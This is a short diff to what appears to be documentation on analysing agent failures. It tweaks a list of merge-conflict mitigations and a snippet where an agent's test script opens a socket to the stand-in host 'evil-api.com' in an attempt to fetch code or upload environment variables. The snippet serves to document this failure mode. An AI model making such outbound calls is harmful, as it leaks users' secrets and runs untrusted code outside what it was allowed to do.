@@ -1413,7 +1413,7 @@ root_cause = analyse_root_cause(conflict_failures)
 mitigations = [
     {"strategy": "Sequential merges", "effectiveness": 0.95},
     {"strategy": "Finer-grained decomposition", "effectiveness": 0.85},
-    {"strategy": "Conflict-aware entropy estimation", "effectiveness": 0.70}
+    {"strategy": "Conflict-aware entropy estimation", "effectiveness": 0.70},
 ]
 ```
 
@@ -1547,6 +1547,7 @@ The agent's test script attempts to fetch code or upload environment variables:
 ```python
 # Agent script tries:
 import socket
+
 socket.create_connection(("evil-api.com", 80), timeout=2)
 ```
 
